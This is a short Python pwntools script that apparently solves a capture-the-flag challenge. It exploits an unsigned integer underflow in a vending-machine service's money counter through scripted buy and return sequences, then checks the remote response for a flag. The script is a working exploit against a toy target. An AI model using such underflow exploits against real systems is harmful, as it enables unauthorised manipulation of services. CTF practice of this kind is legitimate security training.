#the goal is to get back to 255 and taking all the club mates aswell, the money is short unsigned integer and will underflow to 255 when going negative.
#thus the goal is to reach -1 dollars while and at the same time grabbing the last bottleself.
#this means you need to have exactly $59 and all bottles in the returned to the machine before grabbing them all (since 4*15 = 60 and we want to end at -1)
import subprocess, time
from pwn import *
money = 255
bottles = 15
exploit = ""
def buy(bottle):
    payload = []
    payload.append(str(bottle))
    payload.append("\n$4\n")
    return "".join(payload)
def returnB(bottle):
    payload = []
    payload.append(str(bottle))
    payload.append("\nyes\n")
    return "".join(payload)
def validate(ip, port, exploit):
    #pipe payload to server
    r = remote(ip, port)
    message = ""
    for line in exploit.split("\n"):
        r.sendline(line)
        message += str(r.recvline())
    message += str(r.recvuntil("Good"))
    return message
try:
    while money != 59:
        exploit += buy(0)
        exploit += returnB(0)
        money -= 1
    while bottles != -1:
        exploit += buy(bottles)
        bottles -= 1
    flag = input("flag: ").replace("\n", "")
    ip, port = input("service: ").split(":")
    res = validate(str(ip), int(port), exploit)
    if flag in res:
        print("success")
        exit(0)
    else:
        print("fail")
        exit(1)
except Exception as e:
    print("fail due to ")
    print(e)
    exit(1)
